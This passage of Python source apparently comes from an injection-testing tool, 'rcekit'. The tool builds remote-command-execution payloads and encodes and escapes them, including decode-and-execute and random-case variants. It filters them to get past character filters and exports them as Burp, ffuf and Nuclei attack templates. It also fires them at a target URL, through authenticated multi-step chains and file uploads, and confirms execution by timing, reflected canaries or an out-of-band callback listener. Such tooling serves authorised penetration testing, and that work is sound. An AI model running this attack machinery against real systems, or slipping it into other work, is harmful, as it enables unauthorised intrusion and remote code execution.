                    b = random.randint(1000, 9999)
                    working = working.replace("{math}", f"{a}*{b}")
                    math_match = rf"(^|\D){a * b}(\D|$)"

                # Decide separator-validity on the canonical payload, before any
                # encoding hides (or spuriously reveals) the leading separator.
                separator_led = self._is_separator_led(working, environment, context_name)

                encoded_payload = self.encoding_methods[enc_name](working)
                escape = context.get("escape", "none")
                escaped_payload = self._escape_for_context(encoded_payload, escape)
                wrapped_payload = f"{context['prefix']}{escaped_payload}{context['suffix']}"
                # Dedup per environment, not by payload text alone: a command
                # shared across environments (e.g. `whoami` on unix/docker/kube)
                # keeps a record — and its provenance — for each, instead of
                # collapsing to whichever environment happened to emit it first.
                # Identical text within one environment still collapses; text
                # outputs de-duplicate the lines again downstream.
                dedup_key = (environment, wrapped_payload)
                if dedup_key in generated_payloads:
                    continue
                generated_payloads.add(dedup_key)

                final_notes = list(notes)
                if enc_name not in {"none", "url_encode", "double_url_encode"}:
                    final_notes.append("This encoded variant requires a decode-and-execute path before the primary indicator is observable.")
                if escape != "none":
                    final_notes.append(f"Payload is escaped for the '{context_name}' serialization context; the sink must decode it before execution.")

                # Machine-readable success signature: a reflected canary token is
                # the exact confirmation string; OOB/timing use their own oracle;
                # otherwise fall back to the inferred command-output regex, which
                # matches the response regardless of how the payload was encoded.
                if exp_channel in {"interactsh", "timing"}:
                    match = None
                elif math_match is not None:
                    match = math_match
                elif token is not None:
                    match = re.escape(token)
                else:
                    match = match_sig

                yield PayloadRecord(
                    payload=wrapped_payload,
                    mode=mode,
                    category=category,
                    environment=environment,
                    context=context_name,
                    encoding=enc_name,
                    sink=sink,
                    indicator=ind,
                    safety=safety if safety in SAFETY_ORDER else "intrusive",
                    expected_channel=exp_channel,
                    runner=runner,
                    tags=tags,
                    notes=tuple(dict.fromkeys(final_notes)),
                    blocking=blocking,
                    stateful=stateful,
                    destructive=destructive,
                    separator_led=separator_led,
                    token=token,
                    oob_host=oob_host,
                    match=match,
                    expected_delay_ms=expected_delay_ms,
                )
            except Exception as exc:
                logger.error("Error encoding payload with %s: %s", enc_name, exc)

    def _generate_oob_token(self) -> str:
        return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))

    def _generate_canary(self) -> str:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))

    def _is_separator_led(self, core: str, environment: str, context: str) -> bool:
        """True if this canonical (pre-encoding) payload can break out of a
        mid-command injection point.

        Judged on the raw payload rather than the final encoded/wrapped string:
        a url-encoded ``; id`` no longer *looks* separator-led once the ``;`` is
        percent-escaped, but it still fires once the sink decodes it. Conversely
        a bare ``id`` never fires mid-command no matter how it is encoded, so its
        separator-validity must be decided before encoding is applied.
        """
        if environment not in self.separator_envs:
            return True  # non-shell sinks are not command-concatenation points
        if context in {"shell_single_quoted", "shell_double_quoted"}:
            return True  # quote break-outs supply their own separator
        return core.startswith(self.command_separators)

    def _filter_by_profile(
        self,
        records: Iterator[PayloadRecord],
        deny_chars: Optional[str] = None,
        max_length: Optional[int] = None,
        needs_separator: bool = False,
        blind: bool = False,
    ) -> Iterator[PayloadRecord]:
        """Keep only payloads a target with this shape could actually accept.

        * ``deny_chars`` / ``max_length`` drop payloads a filter would reject
          (checked on the final wrapped/encoded payload, so a URL-encoded quote
          survives a quote filter because the literal character is gone).
        * ``needs_separator`` (sink concatenates input mid shell command) keeps
          only payloads whose canonical form begins with a command separator, so
          an encoded break-out survives while an encoded bare command does not.
        * ``blind`` (sink returns no output) keeps only payloads confirmable
          out-of-band: timing (blocking) or OOB callbacks.
        """
        denied = set(deny_chars) if deny_chars else set()
        for record in records:
            if max_length and len(record.payload) > max_length:
                continue
            if denied and any(char in record.payload for char in denied):
                continue
            if needs_separator and not record.separator_led:
                continue
            if blind and not (record.blocking or record.oob_host or record.expected_channel == "interactsh"):
                continue
            yield record

    @staticmethod
    def _interleave(records: Iterator[PayloadRecord], key) -> Iterator[PayloadRecord]:
        """Reorder records round-robin across buckets keyed by ``key`` so a
        downstream ``--max-payloads`` cap yields a balanced sample spanning
        categories/environments/sinks instead of exhausting the first bucket
        (the old cap returned only the first category/environment/context).
        Relative order within each bucket is preserved."""
        from collections import deque
        buckets: Dict[Any, "deque"] = {}
        for record in records:
            buckets.setdefault(key(record), deque()).append(record)
        queues = list(buckets.values())
        while queues:
            nxt = []
            for queue in queues:
                yield queue.popleft()
                if queue:
                    nxt.append(queue)
            queues = nxt

    def save_payloads_to_file(
        self,
        file_path: str,
        max_payloads: int = None,
        output_format: str = "text",
        include_metadata: bool = False,
        deny_chars: Optional[str] = None,
        max_length: Optional[int] = None,
        needs_separator: bool = False,
        blind: bool = False,
        request_template: Optional[Dict[str, Any]] = None,
        **kwargs,
    ) -> int:
        """
        Generate payloads and write them in the requested output format.

        Formats: ``text`` / ``jsonl`` (single file, plus a ``.meta.jsonl`` and,
        when correlation tokens are present, a ``.map.jsonl`` sidecar),
        ``burp`` (per-context wordlists + request template for Burp/ffuf), and
        ``nuclei`` (runnable Nuclei templates keyed to the payloads' oracle).

        Returns the number of payloads written.
        """
        output_path = Path(file_path)
        records = self.generate_payload_records(**kwargs)
        if deny_chars or max_length or needs_separator or blind:
            records = self._filter_by_profile(records, deny_chars, max_length, needs_separator, blind)
        # When capping, interleave so the cap samples across the whole corpus
        # rather than exhausting the first category/environment/context.
        if max_payloads:
            records = self._interleave(records, key=lambda r: (r.category, r.environment, r.sink))

        if output_format == "burp":
            return self._write_burp(output_path, records, max_payloads, request_template)
        if output_format == "ffuf":
            return self._write_ffuf(output_path, records, max_payloads, request_template)
        if output_format == "nuclei":
            return self._write_nuclei(output_path, records, max_payloads, request_template)

        count = 0
        manifest: List[Dict[str, Any]] = []
        metadata_path = output_path.with_suffix(f"{output_path.suffix}.meta.jsonl")
        map_path = output_path.with_suffix(f"{output_path.suffix}.map.jsonl")
        try:
            with output_path.open("w", encoding="utf-8") as file:
                metadata_file = metadata_path.open("w", encoding="utf-8") if include_metadata and output_format == "text" else None
                # Text output is a plain wordlist, so collapse duplicate payload
                # lines that the per-environment records now produce; jsonl and
                # the .map/.meta sidecars keep every record so multi-environment
                # provenance is preserved.
                text_seen: Set[str] = set()
                try:
                    for record in records:
                        serialized = json.dumps(asdict(record), ensure_ascii=True)
                        if output_format == "jsonl":
                            file.write(serialized + "\n")
                            wrote = True
                        elif record.payload in text_seen:
                            wrote = False
                        else:
                            file.write(record.payload + "\n")
                            if metadata_file:
                                metadata_file.write(serialized + "\n")
                            text_seen.add(record.payload)
                            wrote = True
                        if record.token or record.match:
                            manifest.append({
                                "token": record.token,
                                "oob_host": record.oob_host,
                                "payload": record.payload,
                                "category": record.category,
                                "environment": record.environment,
                                "context": record.context,
                                "sink": record.sink,
                                "encoding": record.encoding,
                                "expected_channel": record.expected_channel,
                                "indicator": record.indicator,
                                "match": record.match,
                                "destructive": record.destructive,
                            })
                        if wrote:
                            count += 1
                            if max_payloads and count >= max_payloads:
                                break
                finally:
                    if metadata_file:
                        metadata_file.close()

            if manifest:
                with map_path.open("w", encoding="utf-8") as map_file:
                    for entry in manifest:
                        map_file.write(json.dumps(entry, ensure_ascii=True) + "\n")

            logger.info("Successfully generated %s payloads to %s", count, output_path)
            if include_metadata and output_format == "text":
                logger.info("Metadata sidecar written to %s", metadata_path)
            if manifest:
                logger.info("Correlation map (token -> payload) written to %s", map_path)
        except Exception as e:
            logger.error(f"Error writing to file {output_path}: {e}")

        return count

    def _format_outdir(self, output_path: Path, suffix: str) -> Path:
        """Derive an output directory name for multi-file formats."""
        return output_path.with_name(f"{output_path.stem or 'rce_payloads'}_{suffix}")

    def _render_request(self, req: Optional[Dict[str, Any]], url_sub: str, other_sub: str, host: str) -> Optional[str]:
        """Render a profile `request` block into a raw HTTP request, substituting
        the FUZZ marker in the URL (with `url_sub`) and in headers/body (with
        `other_sub`). Returns None if no usable request/marker is present."""
        if not req or not req.get("url"):
            return None
        body = req.get("body") or ""
        headers = req.get("headers") or {}
        if "FUZZ" not in req["url"] and "FUZZ" not in body and not any("FUZZ" in str(v) for v in headers.values()):
            return None
        from urllib.parse import urlsplit
        method = (req.get("method") or ("POST" if body else "GET")).upper()
        parts = urlsplit(req["url"])
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query
        resolved_host = host or parts.netloc or "TARGET-HOST"
        lines = [f"{method} {path.replace('FUZZ', url_sub)} HTTP/1.1", f"Host: {resolved_host}"]
        for key, value in headers.items():
            lines.append(f"{key}: {str(value).replace('FUZZ', other_sub)}")
        rendered = "\n".join(lines)
        if body:
            rendered += "\n\n" + body.replace("FUZZ", other_sub)
        return rendered

    def _write_wordlists(self, outdir: Path, records: Iterator[PayloadRecord],
                         max_payloads: Optional[int]) -> Tuple[int, Dict[str, List[str]]]:
        """Write deduplicated, watermark-free payload wordlists grouped by
        injection context (``payloads-<context>.txt`` plus a combined
        ``payloads-all.txt``). Whatever encodings the caller selected are honoured
        as-is — the wordlist is the literal set of strings to fuzz with, so a
        ``base64_decode_exec`` or ``random_case`` variant (which Burp/ffuf cannot
        reproduce with a processing rule) is kept rather than silently dropped.
        For a raw-only list, generate with ``--encodings none``.
        """
        groups: Dict[str, List[str]] = {}
        seen: Set[str] = set()
        count = 0
        for record in records:
            if record.payload in seen:
                continue
            seen.add(record.payload)
            groups.setdefault(record.context, []).append(record.payload)
            count += 1
            if max_payloads and count >= max_payloads:
                break
        for context_name, items in groups.items():
            (outdir / f"payloads-{context_name}.txt").write_text("\n".join(items) + "\n", encoding="utf-8")
        all_items = [p for items in groups.values() for p in items]
        (outdir / "payloads-all.txt").write_text("\n".join(all_items) + "\n", encoding="utf-8")
        return count, groups

    def _write_burp(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int],
                    request_template: Optional[Dict[str, Any]] = None) -> int:
        """Write context-split payload wordlists for Burp Intruder.

        A ``request.txt`` (with Burp's ``\xa7...\xa7`` position marker) is written
        only when a target profile supplies a real request; without one Burp users
        set the injection point themselves from a captured request, so no generic
        placeholder request is emitted.
        """
        outdir = self._format_outdir(output_path, "burp")
        outdir.mkdir(parents=True, exist_ok=True)
        count = 0
        try:
            count, groups = self._write_wordlists(outdir, records, max_payloads)
            rendered = self._render_request(request_template, "\xa7payload\xa7", "\xa7payload\xa7", "")
            if rendered:
                (outdir / "request.txt").write_text(
                    "# Burp Intruder: load payloads-*.txt as a payload set; the \xa7...\xa7\n"
                    "# marker below is the injection point from your target profile.\n"
                    + rendered + "\n", encoding="utf-8")
                hint = "request.txt from the target profile"
            else:
                hint = "set the payload position in Burp from your captured request"
            logger.info("Burp wordlists written to %s/ (%s payloads across %s context files; %s)",
                        outdir, count, len(groups), hint)
        except Exception as exc:
            logger.error("Error writing Burp output to %s: %s", outdir, exc)
        return count

    def _write_ffuf(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int],
                    request_template: Optional[Dict[str, Any]] = None) -> int:
        """Write ffuf wordlists plus, when a target profile supplies a request
        with a concrete host, a ready-to-run ``request.txt`` (with a real ``FUZZ``
        marker) and ``run.sh``.

        Without a request/injection point — or with only a path-only URL that
        can't name the target host — ffuf has nothing runnable to point at, so
        only the wordlists are written, any stale request/runner is removed, and
        the caller is warned. No unusable placeholder request is fabricated.
        """
        from urllib.parse import urlsplit
        outdir = self._format_outdir(output_path, "ffuf")
        outdir.mkdir(parents=True, exist_ok=True)
        request_path = outdir / "request.txt"
        run_path = outdir / "run.sh"
        count = 0
        try:
            count, _ = self._write_wordlists(outdir, records, max_payloads)
            rendered = self._render_request(request_template, "FUZZ", "FUZZ", "")
            # ffuf parses the Host from the raw request itself, so a runnable
            # export needs a concrete host — a path-only profile URL only yields a
            # `Host: TARGET-HOST` placeholder, which would run against nothing.
            parts = urlsplit((request_template or {}).get("url", "") if request_template else "")
            if rendered and parts.netloc:
                request_path.write_text(rendered + "\n", encoding="utf-8")
                run_path.write_text(
                    "#!/bin/sh\n"
                    f"ffuf -request request.txt -w payloads-all.txt -request-proto {parts.scheme or 'https'}\n",
                    encoding="utf-8")
                run_path.chmod(0o755)
                logger.info("ffuf export written to %s/ (%s payloads; request.txt + run.sh ready)", outdir, count)
            else:
                # Wordlist-only: never leave a stale runnable request behind from a
                # previous profile-backed run against a different target.
                request_path.unlink(missing_ok=True)
                run_path.unlink(missing_ok=True)
                logger.warning(
                    "ffuf export: no runnable request (needs a --target-profile whose `request.url` is an "
                    "absolute URL including the host, e.g. https://target.example/path, with a FUZZ marker), "
                    "so only wordlists were written to %s/.", outdir)
        except Exception as exc:
            logger.error("Error writing ffuf output to %s: %s", outdir, exc)
        return count

    def _write_nuclei(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int],
                      request_template: Optional[Dict[str, Any]] = None) -> int:
        """Emit Nuclei templates grouped by environment and oracle (OOB / time-based / reflection)."""
        # A profile request block shapes the raw request; otherwise a generic
        # GET ?rcekit=<payload> is used.
        raw_request = self._render_request(request_template, "{{url_encode(payload)}}", "{{payload}}", "{{Hostname}}")
        outdir = self._format_outdir(output_path, "nuclei")
        outdir.mkdir(parents=True, exist_ok=True)
        canary = "RCEKITCANARY"
        groups: "Dict[Tuple[str, str], List[str]]" = {}
        seen: "Dict[Tuple[str, str], Set[str]]" = {}
        sleep_tokens = ("sleep", "timeout", "start-sleep", "pg_sleep", "thread.sleep", "time.sleep")
        count = 0
        for record in records:
            # Nuclei url-encodes the payload itself, so only the unencoded form
            # is meaningful (and encoded blobs would hide the OOB host).
            if record.encoding != "none":
                continue
            # Without a custom request the payload goes into a generic URL
            # parameter, so only the raw context applies. With a profile request
            # block the template defines the injection point, so honour whatever
            # context the profile selected (e.g. a JSON-escaped body value).
            if raw_request is None and record.context != "raw":
                continue
            payload = record.payload
            lower = payload.lower()
            if record.oob_host:
                payload = payload.replace(record.oob_host, "{{interactsh-url}}")
                oracle = "oob"
            elif any(t in lower for t in sleep_tokens) and "tail" not in lower:
                # Only bounded sleeps give a reliable duration matcher; normalise
                # every delay to 6 seconds so "duration>=6" is meaningful.
                payload = re.sub(r"(?i)(sleep\s+)\d+", r"\g<1>6", payload)
                payload = re.sub(r"(?i)(-seconds\s+)\d+", r"\g<1>6", payload)
                payload = re.sub(r"(?i)(/t\s+)\d+", r"\g<1>6", payload)
                payload = re.sub(r"(?i)(pg_sleep\()\d+", r"\g<1>6", payload)
                oracle = "time"
            elif record.token and record.mode == "detection":
                payload = payload.replace(record.token, canary)
                oracle = "reflect"
            else:
                continue
            key = (record.environment, oracle)
            bucket = seen.setdefault(key, set())
            if payload in bucket:
                continue
            bucket.add(payload)
            groups.setdefault(key, []).append(payload)
            count += 1
            if max_payloads and count >= max_payloads:
                break
        try:
            for (env, oracle), payloads in groups.items():
                template = self._nuclei_template(env, oracle, payloads, canary, raw_request)
                (outdir / f"rcekit-{env}-{oracle}.yaml").write_text(template, encoding="utf-8")
            logger.info("Nuclei templates written to %s/ (%s templates, %s payloads)", outdir, len(groups), count)
        except Exception as exc:
            logger.error("Error writing Nuclei output to %s: %s", outdir, exc)
        return count

    def _nuclei_template(self, env: str, oracle: str, payloads: List[str], canary: str,
                         raw_request: Optional[str] = None) -> str:
        plist = "\n".join(f"          - {json.dumps(p)}" for p in payloads)
        if raw_request:
            request_lines = "\n".join(f"        {line}" for line in raw_request.split("\n")) + "\n\n"
            request_desc = "the request defined by the target profile"
        else:
            request_lines = "        GET /?rcekit={{url_encode(payload)}} HTTP/1.1\n        Host: {{Hostname}}\n\n"
            request_desc = "a URL parameter"
        if oracle == "oob":
            name = f"Out-of-band RCE probe ({env})"
            matcher = (
                "    matchers:\n"
                "      - type: word\n"
                "        part: interactsh_protocol\n"
                "        words:\n"
                "          - \"dns\"\n"
                "          - \"http\""
            )
        elif oracle == "time":
            name = f"Time-based blind RCE probe ({env})"
            matcher = (
                "    matchers:\n"
                "      - type: dsl\n"
                "        dsl:\n"
                "          - \"duration>=6\""
            )
        else:
            name = f"Reflected RCE probe ({env})"
            matcher = (
                "    matchers:\n"
                "      - type: word\n"
                "        part: body\n"
                "        words:\n"
                f"          - \"{canary}\""
            )
        return (
            f"id: rcekit-{env}-{oracle}\n\n"
            "info:\n"
            f"  name: {name}\n"
            "  author: rcekit\n"
            "  severity: high\n"
            f"  description: Injects {env} RCE payloads into {request_desc} and confirms execution via the {oracle} oracle.\n"
            f"  tags: rce,rcekit,{env},{oracle}\n\n"
            "http:\n"
            "  - raw:\n"
            "      - |\n"
            f"{request_lines}"
            "    payloads:\n"
            "      payload:\n"
            f"{plist}\n"
            "    attack: batteringram\n"
            "    stop-at-first-match: true\n\n"
            f"{matcher}\n"
        )

    # Injection-location encoders for live verification. Each turns the canonical
    # payload (the exact bytes the sink must receive) into the on-the-wire form
    # for one injection point, so the delivery layer never corrupts it:
    #   * query_value / url_path — percent-encode; the server URL-decodes it back.
    #   * form_value             — form percent-encode (x-www-form-urlencoded body).
    #   * json_string            — JSON string escaping ONLY. A JSON body is not
    #                              percent-decoded, so percent-encoding here would
    #                              hand the sink the literal "%3B%20id" instead of
    #                              "; id" and the oracle would never fire.
    #   * header                 — keep the payload on one header line (strip CR/LF).
    #   * raw                    — send verbatim (unknown/custom body).
    _INJECTION_ENCODERS = {
        "query_value": lambda p: urllib.parse.quote(p, safe=""),
        "url_path": lambda p: urllib.parse.quote(p, safe="/"),
        "form_value": lambda p: urllib.parse.quote_plus(p),
        "json_string": lambda p: json.dumps(p)[1:-1],
        "header": lambda p: p.replace("\r", " ").replace("\n", " "),
        "raw": lambda p: p,
    }

    def _encode_for_location(self, payload: str, location: str) -> str:
        encoder = self._INJECTION_ENCODERS.get(location)
        if encoder is None:
            raise ValueError(f"Unknown injection location: {location!r}")
        return encoder(payload)

    @staticmethod
    def _content_type(headers: Optional[List[str]]) -> str:
        for header in headers or []:
            name, _, value = header.partition(":")
            if name.strip().lower() == "content-type":
                return value.strip().lower()
        return ""

    def _detect_body_location(self, data: Optional[str], headers: Optional[List[str]]) -> str:
        """Pick the on-the-wire encoding for a payload injected into the request
        body, from the Content-Type header first, then the body's own shape."""
        ctype = self._content_type(headers)
        if "json" in ctype:
            return "json_string"
        if "x-www-form-urlencoded" in ctype:
            return "form_value"
        stripped = (data or "").strip()
        if stripped[:1] in "{[":
            return "json_string"
        if re.match(r"^[^\s=&]+=[^&]*(&[^\s=&]+=[^&]*)*$", stripped):
            return "form_value"
        return "raw"

    def _build_verify_request(
        self,
        payload: str,
        url: str,
        data: Optional[str],
        headers: Optional[List[str]],
        url_location: str,
        body_location: str,
        mark: str = "FUZZ",
    ) -> Tuple[str, Optional[bytes], Dict[str, str]]:
        """Render one verification request, encoding the payload independently
        for each injection point it lands in (URL / body / header). This replaces
        the old blanket URL-encoding, which corrupted JSON bodies and
        double-encoded already-encoded payloads."""
        target = url.replace(mark, self._encode_for_location(payload, url_location))
        body: Optional[bytes] = None
        if data is not None:
            body = data.replace(mark, self._encode_for_location(payload, body_location)).encode()
        hdrs: Dict[str, str] = {"User-Agent": "rcekit-verify"}
        for header in headers or []:
            name, _, value = header.partition(":")
            hdrs[name.strip()] = value.strip().replace(mark, self._encode_for_location(payload, "header"))
        return target, body, hdrs

    def _evaluate_verify(self, record: PayloadRecord, status: Optional[int], body: str,
                         elapsed: float, baseline: float, margin: float = 2.0,
                         control_body: str = "", elapsed_confirm: Optional[float] = None) -> Tuple[str, str]:
        """Apply the payload's built-in oracle to a target response.

        The verdicts are *differential* so ``confirmed`` means execution, not
        coincidence:

        * **timing** — a candidate delay must clear ``baseline`` by ``margin``
          (a noise-aware threshold that adapts to the payload's own
          ``expected_delay_ms``, not a fixed constant) *and* reproduce on a
          second fire (``elapsed_confirm``); a one-off slow response is jitter,
          not a sleep, and is reported ``no-delay``. A request that hangs past
          the timeout (``status is None``) is itself a signal for a sleep
          payload — reported ``timing-candidate-on-timeout`` rather than a flat
          ``error`` — since the timeout may be the expected delay.
        * **reflection** — a ``match`` that is also present in ``control_body``
          is not evidence of execution, so it is reported ``inconclusive``
          rather than a false ``confirmed``. For a canary token the caller
          supplies a *same-token* control (the token in an inert, non-executing
          carrier), so a target that merely echoes input cannot masquerade as
          execution; for a command-output signature the control is the
          payload-free baseline response.
        """
        # OOB is confirmed out-of-band, so a timed-out delivery request does not
        # change the verdict — check it before the generic status==None error.
        if record.expected_channel == "interactsh":
            return "oob-pending", f"watch token {record.token} at your OOB listener"
        if record.expected_channel == "timing" or record.blocking:
            if status is None:
                # The delivery request hung past the timeout. For a sleep payload
                # that hang is the signal, but we could not measure it, so flag a
                # candidate the operator can confirm with a larger --verify-timeout.
                if elapsed - baseline >= margin:
                    return "timing-candidate-on-timeout", (
                        f"request hung {elapsed:.1f}s (>= timeout) vs baseline {baseline:.1f}s; "
                        "raise --verify-timeout above the expected delay to confirm")
                return "error", body[:80]
            if elapsed - baseline < margin:
                return "no-delay", f"{elapsed:.1f}s vs baseline {baseline:.1f}s (needs +{margin:.1f}s)"
            if elapsed_confirm is not None and elapsed_confirm - baseline < margin:
                return "no-delay", (f"delay {elapsed:.1f}s did not reproduce on re-fire "
                                    f"({elapsed_confirm:.1f}s vs baseline {baseline:.1f}s)")
            return "confirmed", f"delay {elapsed:.1f}s vs baseline {baseline:.1f}s (margin {margin:.1f}s)"
        if status is None:
            return "error", body[:80]
        if record.match:
            if self._encoded_search(record.match, body):
                if control_body and self._encoded_search(record.match, control_body):
                    if record.token:
                        return "inconclusive", ("canary reflected by the target in an inert control "
                                                "(no execution needed), so the match is not proof")
                    return "inconclusive", f"signature /{record.match}/ also present without the payload"
                return "confirmed", f"matched /{record.match}/"
            return "no-match", ""
        return "no-signature", "no machine-readable oracle for this payload"

    def _encoded_search(self, pattern: str, body: str) -> bool:
        """Match ``pattern`` against the response body AND against it after peeling
        common output wrappers. A sink that base64/hex-encodes, URL-encodes,
        HTML-escapes, or JSON/unicode-escapes the command output would otherwise
        hide a genuine hit (e.g. ``dWlkPTA=`` instead of ``uid=0``). Every decode
        is best-effort and additive: the raw body is always checked first, so this
        only ever turns a missed confirmation into a hit, never the reverse."""
        import base64, binascii, html as _html, urllib.parse, codecs
        if re.search(pattern, body):
            return True
        candidates: List[str] = []
        try:
            candidates.append(urllib.parse.unquote(body))
        except Exception:
            pass
        try:
            candidates.append(_html.unescape(body))
        except Exception:
            pass
        try:
            candidates.append(codecs.decode(body, "unicode_escape"))
        except Exception:
            pass
        for token in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", body):
            try:
                decoded = base64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8", "replace")
                candidates.append(decoded)
            except (binascii.Error, ValueError):
                continue
        for token in re.findall(r"(?:[0-9a-fA-F]{2}){8,}", body):
            try:
                candidates.append(bytes.fromhex(token).decode("utf-8", "replace"))
            except ValueError:
                continue
        return any(re.search(pattern, c) for c in candidates)

    def run_verification(self, records: Iterator[PayloadRecord], url: str, method: str = "GET",
                         data: Optional[str] = None, headers: Optional[List[str]] = None,
                         delay: float = 0.0, timeout: float = 8.0,
                         max_payloads: Optional[int] = None,
                         url_location: str = "query_value",
                         body_location: Optional[str] = None) -> List[Dict[str, Any]]:
        """Fire payloads at an AUTHORISED target and confirm execution via each
        payload's oracle (match regex / canary token / timing). The FUZZ marker in
        the URL / data / headers is replaced with the payload, encoded for the
        injection point it lands in: ``url_location`` for the URL, ``body_location``
        for the request body (auto-detected from Content-Type/body shape when not
        given), and single-line escaping for headers.
        """
        import time
        import urllib.request
        import urllib.error

        resolved_body_location = body_location or self._detect_body_location(data, headers)
        if data is not None:
            logger.info("Verification body injected as '%s'", resolved_body_location)

        def fire(payload: str, req_timeout: Optional[float] = None):
            target, body, hdrs = self._build_verify_request(
                payload, url, data, headers, url_location, resolved_body_location)
            request = urllib.request.Request(target, data=body, headers=hdrs, method=method)
            start = time.time()
            try:
                with urllib.request.urlopen(request, timeout=req_timeout or timeout) as response:
                    return response.status, response.read().decode(errors="replace"), time.time() - start
            except urllib.error.HTTPError as exc:
                return exc.code, exc.read().decode(errors="replace"), time.time() - start
            except Exception as exc:  # network error, timeout, etc.
                return None, str(exc), time.time() - start

        # Baseline from several benign requests: a single sample can be a cold
        # start or a jitter spike, which would poison every timing verdict. Take
        # a robust centre (median) plus a noise-aware margin (floored, but at
        # least a few times the observed spread), and keep one payload-free body
        # as the control for the reflection differential.
        import statistics

        baseline_samples: List[float] = []
        control_body = ""
        for _ in range(3):
            _, cbody, sample = fire(f"rcekit-baseline-{self._generate_canary()}")
            baseline_samples.append(sample)
            control_body = cbody
        baseline = statistics.median(baseline_samples)
        spread = max(baseline_samples) - min(baseline_samples)
        noise = 3 * spread

        results: List[Dict[str, Any]] = []
        seen: Set[str] = set()
        for record in records:
            if record.payload in seen:
                continue
            seen.add(record.payload)
            is_timing = record.expected_channel == "timing" or record.blocking
            # Adapt the confirmation threshold and the request timeout to the
            # payload's own expected delay. A known short sleep (e.g. 1s) only
            # needs to clear the measured noise plus half its expected delay, so
            # it is no longer unverifiable under the old flat 2s floor; an unknown
            # delay keeps the conservative 2s floor. The timeout is stretched past
            # the expected delay so the sleep can complete instead of timing out.
            expected = (record.expected_delay_ms / 1000.0) if (is_timing and record.expected_delay_ms) else None
            if expected is not None:
                margin = max(0.5, noise, 0.5 * expected)
                req_timeout = max(timeout, baseline + expected + 2.0)
            else:
                margin = max(2.0, noise)
                req_timeout = timeout
            status, body, elapsed = fire(record.payload, req_timeout if is_timing else None)
            # Only a candidate delay is worth a confirmatory re-fire; this keeps
            # the extra request off the vast majority of payloads.
            elapsed_confirm: Optional[float] = None
            if is_timing and status is not None and elapsed - baseline >= margin:
                _, _, elapsed_confirm = fire(record.payload, req_timeout)
            # Paired negative control for a reflected canary. The canary token
            # sits verbatim in the payload, so a target that merely echoes input
            # returns it without executing anything. Re-fire the SAME token in an
            # inert carrier (no command structure) at the same injection point:
            # if the token still comes back, the match is reflection, not
            # execution, and _evaluate_verify downgrades it to inconclusive. Only
            # done when the primary actually matched, so it costs nothing on the
            # vast majority of payloads.
            reflection_control = control_body
            if (record.token and record.match and not is_timing
                    and record.expected_channel != "interactsh"
                    and status is not None and re.search(record.match, body)):
                _, reflection_control, _ = fire(f"rcekit-control-{record.token}")
            verdict, detail = self._evaluate_verify(
                record, status, body, elapsed, baseline, margin, reflection_control, elapsed_confirm)
            results.append({
                "verdict": verdict, "detail": detail, "status": status,
                "payload": record.payload, "category": record.category,
                "environment": record.environment, "context": record.context,
                "encoding": record.encoding, "token": record.token,
            })
            if delay:
                time.sleep(delay)
            if max_payloads and len(results) >= max_payloads:
                break
        return results

    def run_verification_chain(self, records: Iterator[PayloadRecord], chain: Dict[str, Any],
                               delay: float = 0.0, timeout: float = 20.0,
                               max_payloads: Optional[int] = None) -> List[Dict[str, Any]]:
        """Deliver each payload through a multi-step, session-aware request chain
        (login -> CSRF extraction -> prerequisite requests -> payload delivery ->
        trigger), then confirm execution either in-band (the payload's ``match``
        oracle against a chosen step's response) or out-of-band (a ``{callback}``
        URL received by RCEKit's own OOB listener). This reaches sinks that a
        single stateless request cannot: authenticated flows, injection carried in
        uploaded file content, and blind/async execution.

        ``chain`` keys: ``base`` (URL prefix), ``steps`` (ordered list),
        ``confirm_step`` (name/index whose response is matched; default last),
        ``callback_host`` and ``listen_port`` (OOB listener the target calls back
        to). Each step: ``method``, ``path``, optional ``headers``, and one body of
        ``body`` (raw), ``json`` (string), ``form`` (dict) or ``multipart``
        (``{"fields": {...}, "file": {"field","filename","content"}}``). ``FUZZ``
        anywhere in a step's body/content is where the payload lands; ``{var}`` is
        substituted from earlier steps' ``extract`` ({var: regex-with-one-group}).
        """
        import time, os, json as _json, http.cookiejar, urllib.request, urllib.parse

        base = chain.get("base", "").rstrip("/")
        steps = chain["steps"]
        confirm_key = chain.get("confirm_step")
        callback_host = chain.get("callback_host")
        listen_port = int(chain.get("listen_port", 0) or 0)

        listener = None
        if listen_port:
            listener = OOBListener()
            listener.start_http(listen_port)
            logger.info("Chain OOB listener on port %s", listen_port)

        def subst(text: str, ctx: Dict[str, str]) -> str:
            for key, val in ctx.items():
                text = text.replace("{" + key + "}", val)
            return text

        def run_steps(payload: str, token: str) -> Tuple[Dict[str, str], str]:
            cj = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
            # Seed the token so a profile can give each payload a unique filename /
            # path ({token}) — essential when delivery writes to a shared location
            # and an async trigger would otherwise read another payload's content.
            ctx: Dict[str, str] = {"token": token}
            if listener is not None and callback_host:
                cb = f"http://{callback_host}:{listen_port}/{token}"
                payload = payload.replace("{callback}", cb)
                listener.tokens[token] = {"payload": payload, "category": "chain", "context": "chain"}
            confirm_body = ""
            for idx, step in enumerate(steps):
                path = subst(step["path"], ctx)
                url = path if path.startswith("http") else base + path
                headers = {k: subst(v, ctx).replace("FUZZ", payload)
                           for k, v in (step.get("headers") or {}).items()}
                data = None
                if "multipart" in step:
                    mp = step["multipart"]
                    boundary = "----rcekitChain"
                    parts = []
                    for fname, fval in (mp.get("fields") or {}).items():
                        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{fname}\"\r\n\r\n"
                                     f"{subst(str(fval), ctx).replace('FUZZ', payload)}\r\n")
                    fl = mp.get("file")
                    body = "".join(parts).encode()
                    if fl:
                        content = subst(str(fl.get("content", "")), ctx).replace("FUZZ", payload)
                        filename = subst(str(fl.get("filename", "file")), ctx).replace("FUZZ", payload)
                        body += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{fl['field']}\"; "
                                 f"filename=\"{filename}\"\r\n"
                                 f"Content-Type: application/octet-stream\r\n\r\n").encode() + content.encode()
                    body += f"\r\n--{boundary}--\r\n".encode()
                    data = body
